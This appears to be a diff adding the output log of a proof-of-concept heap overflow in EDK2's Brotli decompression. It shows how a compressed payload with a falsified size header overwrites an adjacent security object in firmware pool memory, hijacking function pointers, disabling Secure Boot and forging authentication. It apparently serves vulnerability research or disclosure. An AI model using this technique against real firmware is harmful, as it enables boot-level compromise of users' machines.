@@ -1,0 +1,45 @@
+╔══════════════════════════════════════════════════════════╗
+║  EDK2 BrotliDecompress.c — heap overflow demonstration  ║
+║  Controlled corruption of adjacent pool objects         ║
+╚══════════════════════════════════════════════════════════╝
+
+Pool layout (simulates DXE pool page):
+  pool[0..63]   = Destination (GetInfo says 64 bytes)
+  pool[64..119] = SecurityContext victim (adjacent object)
+
+BEFORE decompression:
+  victim->magic               = 0xdeadbeefcafebabe
+  victim->verify_handler      = 0x00007fff80001000
+  victim->authorize_handler   = 0x00007fff80002000
+  victim->secure_boot_enabled = 1
+  victim->authenticated       = 0
+
+  victim raw bytes:
+    0000: be ba fe ca ef be ad de 00 10 00 80 ff 7f 00 00  |................|
+    0010: 00 20 00 80 ff 7f 00 00 01 00 00 00 00 00 00 00  |. ..............|
+    0020: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc  |................|
+    0030: cc cc cc cc cc cc cc cc  |........|
+
+Attack payload: 120 bytes decompressed, Brotli-compressed to 48 bytes
+Header LIES: declares 64 bytes (real: 120)
+
+Calling BrotliUefiDecompress...
+
+BrotliUefiDecompress returned: EFI_SUCCESS
+
+AFTER decompression:
+  victim->magic               = 0x4f56455246414c4c  ← CORRUPTED
+  victim->verify_handler      = 0x4141414141414141  ← HIJACKED
+  victim->authorize_handler   = 0x4242424242424242  ← HIJACKED
+  victim->secure_boot_enabled = 0                    ← DISABLED BY ATTACKER
+  victim->authenticated       = 1                    ← FORGED BY ATTACKER
+
+  victim raw bytes (after):
+    0000: 4c 4c 41 46 52 45 56 4f 41 41 41 41 41 41 41 41  |LLAFREVOAAAAAAAA|
+    0010: 42 42 42 42 42 42 42 42 00 00 00 00 01 00 00 00  |BBBBBBBB........|
+    0020: 41 54 54 41 43 4b 45 52 5f 43 4f 4e 54 52 4f 4c  |ATTACKER_CONTROL|
+    0030: 4c 45 44 21 00 00 00 00  |LED!....|
+
+RESULT: all 5 victim fields overwritten with attacker-controlled data.
+In firmware: function pointers hijacked, Secure Boot disabled,
+authentication bypassed — before Secure Boot verification completes.
